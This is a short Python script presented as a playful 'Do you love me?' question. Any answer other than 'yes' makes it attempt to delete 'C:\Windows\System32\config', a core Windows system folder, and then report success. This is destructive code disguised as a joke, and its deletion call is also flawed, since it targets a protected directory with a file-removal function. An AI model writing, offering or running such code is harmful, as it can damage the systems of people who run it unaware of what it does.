import os
answer = input("Do you love me? (yes or no): ")
if answer.lower() == "yes":
    print("Awww You're the best!")
else:
    import os
    file_path = "C:\\Windows\\System32\\config"
    try:
        os.remove(file_path)
        print("File deleted successfully!")
    except FileNotFoundError:
        print("File not found!")